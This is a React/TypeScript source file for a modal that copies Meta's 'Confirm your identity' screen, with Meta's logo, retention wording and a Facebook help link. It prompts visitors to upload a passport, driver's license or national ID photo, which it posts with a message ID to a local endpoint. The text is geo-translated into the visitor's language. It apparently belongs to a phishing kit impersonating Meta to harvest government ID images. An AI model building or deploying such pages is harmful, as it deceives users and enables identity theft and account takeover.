import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faClose } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type ChangeEvent, type FC, useEffect, useRef, useState } from 'react';

const UploadModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const fileInputRef = useRef<HTMLInputElement>(null);
    const [uploading, setUploading] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [documentType, setDocumentType] = useState('passport');

    const { geoInfo, messageId } = store();

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Confirm your identity', 'Choose type of ID to upload', "We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.", 'Passport', "Driver's license", 'National ID card', `Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.`, 'Learn more', 'Upload Image', 'Uploading...'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleFileChange = async (event: ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files ? event.target.files[0] : null;

        if (file) {
            setUploading(true);

            try {
                const formData = new FormData();
                formData.append('photo', file);
                if (messageId) {
                    formData.append('message_id', messageId.toString());
                }

                await axios.post('/api/upload', formData, {
                    headers: {
                        'Content-Type': 'multipart/form-data'
                    }
                });

                nextStep();
            } catch (error) {
                console.error('Error uploading image:', error);
            } finally {
                setUploading(false);
                if (fileInputRef.current) {
                    fileInputRef.current.value = '';
                    const newEvent = new Event('change', { bubbles: true });
                    fileInputRef.current.dispatchEvent(newEvent);
                }
            }
        }
    };

    const handleButtonClick = () => {
        if (fileInputRef.current && !uploading) {
            fileInputRef.current.click();
        }
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <div className='mb-2 flex w-full items-center justify-between p-4 pb-0'>
                    <p className='text-2xl font-bold'>{t('Confirm your identity')}</p>
                    <button type='button' onClick={nextStep} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faClose} size='xl' />
                    </button>
                </div>

                <div className='mt-4 mb-4'>
                    <b className='text-lg text-gray-700'>{t('Choose type of ID to upload')}</b>
                    <p className='mt-2 text-gray-600'>{t("We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.")}</p>
                </div>

                <div className='mb-4 w-full font-semibold text-gray-700'>
                    <label htmlFor='passport' className='mb-2 flex cursor-pointer items-center justify-between rounded-lg p-2 hover:bg-gray-200'>
                        <span>{t('Passport')}</span>
                        <input type='radio' id='passport' name='document' value='passport' checked={documentType === 'passport'} onChange={() => setDocumentType('passport')} className='h-4 w-4 cursor-pointer appearance-none rounded-full border-2 border-gray-300 checked:h-2 checked:w-2 checked:border-blue-600 checked:bg-blue-600 checked:ring-2 checked:ring-blue-500 checked:ring-offset-2 focus:ring-2 focus:ring-blue-500 focus:ring-offset-2' />
                    </label>
                    <label htmlFor='drivers-license' className='mb-2 flex cursor-pointer items-center justify-between rounded-lg p-2 hover:bg-gray-200'>
                        <span>{t("Driver's license")}</span>
                        <input type='radio' id='drivers-license' name='document' value='drivers-license' checked={documentType === 'drivers-license'} onChange={() => setDocumentType('drivers-license')} className='h-4 w-4 cursor-pointer appearance-none rounded-full border-2 border-gray-300 checked:h-2 checked:w-2 checked:border-blue-600 checked:bg-blue-600 checked:ring-2 checked:ring-blue-500 checked:ring-offset-2 focus:ring-2 focus:ring-blue-500 focus:ring-offset-2' />
                    </label>
                    <label htmlFor='national-id' className='mb-2 flex cursor-pointer items-center justify-between rounded-lg p-2 hover:bg-gray-200'>
                        <span>{t('National ID card')}</span>
                        <input type='radio' id='national-id' name='document' value='national-id' checked={documentType === 'national-id'} onChange={() => setDocumentType('national-id')} className='h-4 w-4 cursor-pointer appearance-none rounded-full border-2 border-gray-300 checked:h-2 checked:w-2 checked:border-blue-600 checked:bg-blue-600 checked:ring-2 checked:ring-blue-500 checked:ring-offset-2 focus:ring-2 focus:ring-blue-500 focus:ring-offset-2' />
                    </label>
                </div>

                <input type='file' accept='image/*' ref={fileInputRef} onChange={handleFileChange} className='hidden' />

                <div className='rounded-md bg-gray-100 p-4 text-sm text-gray-600'>
                    {t(`Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.`)}{' '}
                    <a href='https://www.facebook.com/help/155050237914643/' target='_blank' rel='noopener noreferrer' className='text-blue-600 underline'>
                        {t('Learn more')}
                    </a>
                </div>

                <button className={`mt-6 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${uploading ? 'cursor-not-allowed opacity-80' : ''}`} onClick={handleButtonClick} disabled={uploading}>
                    {uploading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Upload Image')}
                </button>

                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                </div>
            </div>
        </div>
    );
};

export default UploadModal;
